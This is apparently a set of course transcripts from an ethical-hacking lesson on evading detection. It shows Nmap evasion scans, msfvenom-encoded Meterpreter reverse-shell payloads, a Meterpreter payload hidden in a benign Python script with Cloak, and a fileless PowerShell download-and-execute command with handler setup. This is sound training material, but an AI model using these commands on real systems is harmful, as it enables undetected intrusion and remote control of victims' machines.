> **[1:09](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/exotic-scanning-with-nmap?u=76281980&t=69)** We can do this with the scan delay setting.
>
> **[1:12](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/exotic-scanning-with-nmap?u=76281980&t=72)** Let's re-scan Kali-eminence and we'll set the scan to 500 milliseconds delay.
>
> **[1:18](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/exotic-scanning-with-nmap?u=76281980&t=78)** It'll take some time so we'll scan just a few ports.
>
> **[1:22](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/exotic-scanning-with-nmap?u=76281980&t=82)** Nmap 192.168.1.187 --scan-delay 500 milliseconds
>
> **[1:32](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/exotic-scanning-with-nmap?u=76281980&t=92)** and we'll scan ports 80 to 99.
>
> **[1:37](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/exotic-scanning-with-nmap?u=76281980&t=97)** So that took 10 seconds or so, but as expected we found port 80 open.
>
> **[1:45](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/exotic-scanning-with-nmap?u=76281980&t=105)** We're used to scanning IPv4, which is the defaults in Nmap.
>
> **[1:50](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/exotic-scanning-with-nmap?u=76281980&t=110)** Let's scan our Kali-eminence server again.
>
> **[1:54](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/exotic-scanning-with-nmap?u=76281980&t=114)** And that's got three ports open doing an IPv4 scan.
>
> **[2:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/exotic-scanning-with-nmap?u=76281980&t=120)** Here we can see the interface for Kali-eminence with its IPv4 and IPv6 addresses.
>
> **[2:08](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/exotic-scanning-with-nmap?u=76281980&t=128)** There's an increasing number of systems appearing on the internet, which are capable of IPv6 and these don't always apply the same firewall rules as are applied to IPv4.
>
> **[2:19](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/exotic-scanning-with-nmap?u=76281980&t=139)** Consequently, this may offer an alternative means of scanning and accessing targets when a normal IPv4 scan fails.
>
> **[2:27](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/exotic-scanning-with-nmap?u=76281980&t=147)** We do this simply by using the minus six switch and using a host name, which Nmap will resolve via DNS or using an IPv6 address.
>
> **[2:37](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/exotic-scanning-with-nmap?u=76281980&t=157)** So let's run this Nmap scan against eminence again and we'll run it on our ethernet zero interface against Kali-eminence's IPv6 address as shown.
>
> **[2:55](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/exotic-scanning-with-nmap?u=76281980&t=175)** We get a different result than we did with IPv4.
>
> **[2:58](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/exotic-scanning-with-nmap?u=76281980&t=178)** In this case, we only find port 80 open.
>
> **[3:02](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/exotic-scanning-with-nmap?u=76281980&t=182)** We get less ports accessible when we scan using IPv6, but that might not be the case with some targets.
>
> **[3:10](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/exotic-scanning-with-nmap?u=76281980&t=190)** Another option for scanning, if our normal scan fails, is to use a different scan type.
>
> **[3:15](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/exotic-scanning-with-nmap?u=76281980&t=195)** We can use null scans, Xmas scans, ICMP echo scans, and more.
>
> **[3:20](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/exotic-scanning-with-nmap?u=76281980&t=200)** One particularly useful approach, when we have access to a dual-homed target, is to bounce our scan off that target in order to access a network that it has access to, but which we can't reach directly.
>
> **[3:32](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/exotic-scanning-with-nmap?u=76281980&t=212)** We can do this with what's known as a loose source routing scan using Nmap's IP options.
>
> **[3:38](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/exotic-scanning-with-nmap?u=76281980&t=218)** To demonstrate this, I'll run it on the same network but if we were using it for real, we'd use the target subnet as the reason.
>
> **[3:48](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/exotic-scanning-with-nmap?u=76281980&t=228)** Nmap -sn to do a scan of the subnet,
>
> **[3:52](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/exotic-scanning-with-nmap?u=76281980&t=232)** - -IP-options, and the option we use is the L prefix on the host 192.168.1.51.
>
> **[4:03](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/exotic-scanning-with-nmap?u=76281980&t=243)** We'll bounce this off our Hydra server and for the reason we'll put 192.168.1.0/24
>
> **[4:19](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/exotic-scanning-with-nmap?u=76281980&t=259)** and we'll run this with super-user privileges.
>
> **[4:23](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/exotic-scanning-with-nmap?u=76281980&t=263)** Run this as root.
>
> **[4:25](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/exotic-scanning-with-nmap?u=76281980&t=265)** Okay, so we can see that this has run an arp-check against the subnet from Hydra and returned us the results.

> [!info]- Semantic Content
>
> **Code Keywords:** let (4), interface (2), switch (1), case, (1), type. (1)
> **Env Vars:** tcp (2), rfc (1), dns (1), icmp (1)
> **Versions:** 192.168.1 (4)
> **Ports:** port 80 (2)
> **CLI Commands:** find (1)
> **Documentation:** rfc (1)
> **Definitions:** known as (1)
> **Speakers:** - [instructor] (1)

#### Obfuscating payloads with msfvenom
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obfuscating-payloads-with-msfvenom?u=76281980)

> [!transcript]- Transcript
>
> **[0:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obfuscating-payloads-with-msfvenom?u=76281980&t=1)** - [Instructor] When creating a payload, we need to make sure that it isn't detected as malicious by the target's firewall or IDS system.
>
> **[0:08](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obfuscating-payloads-with-msfvenom?u=76281980&t=8)** To demonstrate how to do this, we'll create an obfuscated payload using the msfvenom tools encoding capability.
>
> **[0:16](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obfuscating-payloads-with-msfvenom?u=76281980&t=16)** We can select one of a number of ways to obfuscate the payload.
>
> **[0:19](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obfuscating-payloads-with-msfvenom?u=76281980&t=19)** We do this by invoking an encoder and we can list out the possible encoders by msfvenom --list encoders.
>
> **[0:34](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obfuscating-payloads-with-msfvenom?u=76281980&t=34)** Okay, there's a few there, and we can see the shikata_ga_nai is reported to be an excellent encoder, so we'll use that one.
>
> **[0:42](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obfuscating-payloads-with-msfvenom?u=76281980&t=42)** Meterpreter can create many different types of payload for a range of targets.
>
> **[0:47](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obfuscating-payloads-with-msfvenom?u=76281980&t=47)** We'll create a Meterpreter reverse TCP payload for Windows X86, msfvenom -p windows/meterpreter/reverse_tcp
>
> **[1:05](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obfuscating-payloads-with-msfvenom?u=76281980&t=65)** - -platform windows -a x86 architecture.
>
> **[1:14](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obfuscating-payloads-with-msfvenom?u=76281980&t=74)** And we'll now set the IP address and port to connect back to LHOST = 10.0.2.15
>
> **[1:23](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obfuscating-payloads-with-msfvenom?u=76281980&t=83)** and LPORT = 4444, and we'll select the shikata_ga_nai encoder with 100 iterations -e x86/shikata_ga_nai -i 100.
>
> **[1:45](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obfuscating-payloads-with-msfvenom?u=76281980&t=105)** And finally, we'll create an EXE payload and call it venom.exe,
>
> **[1:50](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obfuscating-payloads-with-msfvenom?u=76281980&t=110)** - format exe, -f exe, -o venom.exe.
>
> **[1:57](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obfuscating-payloads-with-msfvenom?u=76281980&t=117)** Okay, and we'll run that.
>
> **[2:02](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obfuscating-payloads-with-msfvenom?u=76281980&t=122)** We've now got to cloaked payload, which should be more difficult for an intrusion detection system to detect.

> [!info]- Semantic Content
>
> **Env Vars:** ids (1), tcp (1), x86 (1), lhost (1), lport (1)
> **Code Identifiers:** shikata_ga_nai (3), reverse_tcp (1)
> **Code Keywords:** this, (1), finally, (1)
> **Speakers:** - [instructor] (1), - format (1)
> **CLI Commands:** make (1)
> **Versions:** 10.0.2 (1)
> **UI Navigation:** select the (1)

#### Hiding payloads in benign files
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980)

> [!transcript]- Transcript
>
> **[0:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=1)** - [Instructor] It can be difficult to obfuscate scripted malware as it needs to be in readable form to execute.
>
> **[0:07](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=7)** There are tricks that can be used to achieve this, however.
>
> **[0:10](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=10)** Let's have a look at tool by Somdev which cloaks a Python payload by creating and injecting it into a benign Python script.
>
> **[0:20](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=20)** I've downloaded the script, so let's take a look at it.
>
> **[0:24](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=24)** Nano cloak.py -l.
>
> **[0:29](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=29)** I won't analyze this in detail but there are some interesting aspects to look at.
>
> **[0:34](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=34)** At line 32, the script makes a connection to the Google DNS in order to find the IP address it's running from.
>
> **[0:42](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=42)** At line 47, we can see a call to check that msfvenom is available on the host.
>
> **[0:50](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=50)** And at lines 53 and 58, it get the IP and port from the user.
>
> **[0:57](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=57)** The injector starts at line 124 and at line 127, we can see the msfvenom call that's made for a python/meterpreter shell across HTTPS, saving the payload into a file called payload.txt.
>
> **[1:13](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=73)** This is then read in at lines 130 to 132 and the injection starts.
>
> **[1:19](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=79)** There's a couple of changes I've already done to correct some deliberate mistakes in the code.
>
> **[1:23](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=83)** The first is at line 136.
>
> **[1:25](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=85)** We need to use the seventh element, not the third or fourth.
>
> **[1:31](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=91)** The second is at line 182 to set root defaults before checking.
>
> **[1:36](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=96)** Okay, we're good to go.
>
> **[1:39](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=99)** I've got a useful Python script to list Wi-Fi passwords called wifipw.py.
>
> **[1:45](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=105)** Let's take a look at it.
>
> **[1:47](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=107)** Nano wifipw.py -l.
>
> **[1:54](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=114)** Again, I won't go into the script in detail as it's really just a carrier but we can see at line nine that it's reading one of the network manager files and then iterating around entries.
>
> **[2:05](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=125)** We can run this on our VM.
>
> **[2:08](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=128)** Python3 wifipw.py and we just get the wired connection.
>
> **[2:16](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=136)** That will do.
>
> **[2:18](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=138)** Let's now inject a Python payload into this with Cloak.
>
> **[2:22](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=142)** Python3 cloak.py.
>
> **[2:27](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=147)** Okay, we've got our IP address, use 443 as the port, and we'll use wifipw.py as the carrier.
>
> **[2:38](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=158)** Cloak generates the payload.
>
> **[2:41](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=161)** And we don't need to run the injected script as root.
>
> **[2:45](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=165)** Let's now have a look at our wifipw script.
>
> **[2:48](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=168)** Nano wifipw.py.
>
> **[2:53](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=173)** We can now see that there's some base64 characters in strings at the start of the script.
>
> **[2:58](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=178)** This is our payload split into two chunks and at line 13, we execute it.
>
> **[3:05](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=185)** Okay, let's run this.
>
> **[3:07](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=187)** The first thing we'll do is open a new terminal and set up a Metasploit listener.
>
> **[3:13](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=193)** We'll run sudo msfconsole as we'll want to listen on a low-numbered port.
>
> **[3:25](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=205)** We'll select the multi/handler.
>
> **[3:27](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=207)** Use exploit/multi/handler and we'll select the payload type that we've built.
>
> **[3:38](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=218)** Set payload to python/meterpreter/reverse_https.
>
> **[3:49](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=229)** And we'll set our listener's address.
>
> **[3:52](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=232)** Set lhost 10.0.2.12.
>
> **[3:58](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=238)** Set lport 443 for HTTPS.
>
> **[4:05](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=245)** And we'll run this.
>
> **[4:08](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=248)** We've now got a reverse handler listener and we can run our wifipw script.
>
> **[4:16](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=256)** Python3 wifipw.py and that operates exactly like we'd expect it to but we get a Meterpreter shell open on the attacking system.
>
> **[4:30](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=270)** And we can now run our attack.

> [!info]- Semantic Content
>
> **CLI Commands:** python (6), python3 (3), find (1), sudo (1)
> **Code Keywords:** let (6), this. (2), this, (1), from. (1)
> **File Paths:** wifipw.py (6), cloak.py (2), payload.txt (1)
> **Env Vars:** https (2), dns (1)
> **UI Navigation:** select the (2)
> **Code Identifiers:** reverse_https (1)
> **Versions:** 10.0.2 (1)
> **Tools:** terminal (1)

#### Custom packaging of software
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/custom-packaging-of-software?u=76281980)

> [!transcript]- Transcript
>
> **[0:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/custom-packaging-of-software?u=76281980&t=1)** - [Instructor] A packer is a tool which creates a malware image using various techniques, such as compression, masking with an xor, encryption, and other obfuscations.
>
> **[0:12](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/custom-packaging-of-software?u=76281980&t=12)** Packers may also include special code to check for sandboxing and if found, take action to defeat analysis, such as deleting files and terminating.
>
> **[0:22](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/custom-packaging-of-software?u=76281980&t=22)** The malware which has created is then loaded by some form of stub code, which unpacks it in memory.
>
> **[0:28](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/custom-packaging-of-software?u=76281980&t=28)** While this protects the malware code, the stub code can be used to fingerprint malware even down to specific malware campaigns.
>
> **[0:36](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/custom-packaging-of-software?u=76281980&t=36)** One way to defeat stub code detection is to use a custom packer.
>
> **[0:41](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/custom-packaging-of-software?u=76281980&t=41)** This means that a specific attack has its own unique fingerprint and so can't be detected from having found an earlier attack.
>
> **[0:49](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/custom-packaging-of-software?u=76281980&t=49)** An example of this is the Andromeda Gamarue Custom Packer described in this analysis by Morphisec.
>
> **[0:56](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/custom-packaging-of-software?u=76281980&t=56)** These forms of packers are often a challenge for automated sandbox detectors.

> [!info]- Semantic Content
>
> **Definitions:** is a  (1), means that (1)
> **Analogies:** such as (2)
> **Speakers:** - [instructor] (1)

#### Fileless attacks with PowerShell
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/fileless-attacks-with-powershell?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/fileless-attacks-with-powershell?u=76281980&t=0)** - [Instructor] Fileless malware is the term used to describe an attack technique that runs without writing any malware to disk.
>
> **[0:08](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/fileless-attacks-with-powershell?u=76281980&t=8)** By doing this, it avoids the risk of being detected by a file scan.
>
> **[0:13](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/fileless-attacks-with-powershell?u=76281980&t=13)** PowerShell can be used to execute scripts directly in memory and is a popular choice for fileless attacks.
>
> **[0:20](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/fileless-attacks-with-powershell?u=76281980&t=20)** An example of this is the PowerShell download string method, which downloads content from a remote location to a buffer in memory.
>
> **[0:28](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/fileless-attacks-with-powershell?u=76281980&t=28)** First of all, let's create a PowerShell script payload.
>
> **[0:33](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/fileless-attacks-with-powershell?u=76281980&t=33)** msfvenom -p windows/x64 /meterpreter_reverse_http
>
> **[0:50](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/fileless-attacks-with-powershell?u=76281980&t=50)** and we'll make it PSH format.
>
> **[0:54](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/fileless-attacks-with-powershell?u=76281980&t=54)** We'll set LHOST=10.0.2.12 for our IP address.
>
> **[1:02](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/fileless-attacks-with-powershell?u=76281980&t=62)** LPORT=80 for HTTP and we'll output the file to m64.ps1 as a PowerScript shell.
>
> **[1:17](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/fileless-attacks-with-powershell?u=76281980&t=77)** Okay, we now need to serve this on a website.
>
> **[1:19](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/fileless-attacks-with-powershell?u=76281980&t=79)** So let's use our Python simple HTTP server.
>
> **[1:24](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/fileless-attacks-with-powershell?u=76281980&t=84)** Python -M SimpleHTTPServer.
>
> **[1:32](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/fileless-attacks-with-powershell?u=76281980&t=92)** Now we need to set up a meterpreter listener for PowerShell.
>
> **[1:36](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/fileless-attacks-with-powershell?u=76281980&t=96)** So in our second terminal, we'll run sudo msfconsole, as we need to set up a listener on a low-numbered port.
>
> **[1:57](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/fileless-attacks-with-powershell?u=76281980&t=117)** We'll use exploit/ multi/handler.
>
> **[2:05](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/fileless-attacks-with-powershell?u=76281980&t=125)** We'll set payload to windows/x64/
>
> **[2:16](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/fileless-attacks-with-powershell?u=76281980&t=136)** meterpreter_reverse_http.
>
> **[2:25](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/fileless-attacks-with-powershell?u=76281980&t=145)** We'll set lost to 10.0.2.12.
>
> **[2:32](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/fileless-attacks-with-powershell?u=76281980&t=152)** Set lport to 80 and we'll run.
>
> **[2:41](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/fileless-attacks-with-powershell?u=76281980&t=161)** Okay, we're listening on port 80.
>
> **[2:46](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/fileless-attacks-with-powershell?u=76281980&t=166)** We now need to execute a remote command on the target through some form of technical or social engineering exploit.
>
> **[2:52](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/fileless-attacks-with-powershell?u=76281980&t=172)** I'll simulate this by entering the remote command at the command line in my Windows 10 target.
>
> **[3:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/fileless-attacks-with-powershell?u=76281980&t=180)** Powershell.exe - ep Bypass
>
> **[3:08](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/fileless-attacks-with-powershell?u=76281980&t=188)** - nop -noexit -c iex.
>
> **[3:19](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/fileless-attacks-with-powershell?u=76281980&t=199)** Call the method New-Object Net.WebClient and DownloadString to download our file from HTTP 10.0.2.12:8000 and the file is called m64.ps1.
>
> **[3:53](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/fileless-attacks-with-powershell?u=76281980&t=233)** The bypass parameter will bypass execution policies and is often used by administrators in order to remotely execute commands.
>
> **[4:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/fileless-attacks-with-powershell?u=76281980&t=241)** Okay, let's run this.
>
> **[4:05](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/fileless-attacks-with-powershell?u=76281980&t=245)** And we'll check what's happened in Karli.
>
> **[4:10](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/fileless-attacks-with-powershell?u=76281980&t=250)** Okay, this is run and we can see we have a meterpreter session.
>
> **[4:16](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/fileless-attacks-with-powershell?u=76281980&t=256)** Getuid, and with the WINDEV2002EVAL\User, and we can show into windows and we now have a command shell.
>
> **[4:29](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/fileless-attacks-with-powershell?u=76281980&t=269)** Okay, we've been able to execute a PowerShell command to download and run our payload without it ever being stored on disk.

> [!info]- Semantic Content
>
> **Tools:** powershell (6), terminal (1), command line (1)
> **Env Vars:** http (3), psh (1), lhost (1), lport (1), windev2002eval (1)
> **Code Keywords:** let (3), this, (1), this. (1)
> **CLI Commands:** python (2), make (1), sudo (1)
> **Versions:** 10.0.2 (3)
> **Code Identifiers:** meterpreter_reverse_http (2)
> **Ports:** port 80 (1), :8000 (1)
> **Definitions:** is a  (1), is called (1)

#### Hiding with the cloak of invisibility
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-with-the-cloak-of-invisibility?u=76281980)

> [!transcript]- Transcript
>
> **[0:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-with-the-cloak-of-invisibility?u=76281980&t=1)** - [Instructor] Malware will go out of its way to hide once it's on the target system.
>
> **[0:05](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-with-the-cloak-of-invisibility?u=76281980&t=5)** If it can evade detection, it's more likely to accomplish its intended goals.
>
> **[0:10](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-with-the-cloak-of-invisibility?u=76281980&t=10)** Let's have a look at one way in which this works.
>
> **[0:13](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-with-the-cloak-of-invisibility?u=76281980&t=13)** I'm in a command shell and I'll go into my local user application directory by typing cd appdata\local.
>
> **[0:23](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-with-the-cloak-of-invisibility?u=76281980&t=23)** And I'll go into the Windows sub-sub-sub-directory by typing cd microsoft\windows.
>
> **[0:35](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-with-the-cloak-of-invisibility?u=76281980&t=35)** When I list the contents of the directory, there's a number of files and folders, but there's no history sub-directory.
>
> **[0:42](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-with-the-cloak-of-invisibility?u=76281980&t=42)** When I list hidden files, we can see there are a few, but there's still no history sub-directory.
>
> **[0:48](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-with-the-cloak-of-invisibility?u=76281980&t=48)** However, the history sub-directory does exist.
>
> **[0:51](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-with-the-cloak-of-invisibility?u=76281980&t=51)** We just can't see it.
>
